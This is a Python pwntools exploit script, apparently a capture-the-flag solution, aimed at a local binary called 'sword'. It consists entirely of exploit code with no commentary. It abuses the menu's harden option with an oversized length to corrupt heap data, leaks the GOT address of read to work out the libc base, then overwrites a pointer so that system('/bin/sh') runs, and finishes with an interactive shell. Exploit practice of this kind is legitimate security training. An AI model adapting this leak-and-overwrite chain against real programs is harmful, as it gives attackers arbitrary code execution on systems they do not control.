from pwn import *
from struct import *
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC)
def forgeSword():
    sh.sendlineafter('Quit.\n', '1')

def hardenSword(i, s, length):
    sh.recvuntil('Quit.\n')
    sh.sendline('5')
    sh.sendlineafter('?\n', str(i))
    sh.sendlineafter('?\n', str(length))
    sh.sendlineafter('.\n', s)
    sh.sendlineafter('?\n', '-1')

def wrongHarden(i, length):
    sh.recvuntil('Quit.\n')
    sh.sendline('5')
    sh.sendlineafter('?\n', str(i))
    sh.sendlineafter('?\n', str(length))

def destroySword(i):
    sh.sendlineafter('Quit.\n', '4')
    sh.sendlineafter('?\n', str(i))

def equipSword(i):
    sh.sendlineafter('Quit.\n', '6')
    sh.sendlineafter('?\n', str(i))



sh = process('./sword')
forgeSword()
forgeSword()


wrongHarden(0, 257)

e = ELF("./sword")
read_GOT = e.got['read']
payload = "A"*8
payload += struct.pack('Q', read_GOT)
payload += struct.pack('Q', 0x400b9d)
hardenSword(1, payload, 24)

equipSword(0)
ans = (sh.recvuntil('.....')[12:-5].ljust(8, '\x00'))
ans2 = struct.unpack("Q", ans)
read_offset = libc.symbols['read']

libc_base = ans2[0] - read_offset

print hex(libc_base)

binsh = "/bin/sh\x00"
system_addr = libc_base + libc.symbols['system']
binsh_addr = next(libc.search(binsh)) + libc_base

forgeSword()
forgeSword()
wrongHarden(2, 257)
payload2 = "A"*8
payload2 += struct.pack('L', binsh_addr)
payload2 += struct.pack('L', system_addr)
hardenSword(3, payload2, 32)
equipSword(2)
sh.interactive()

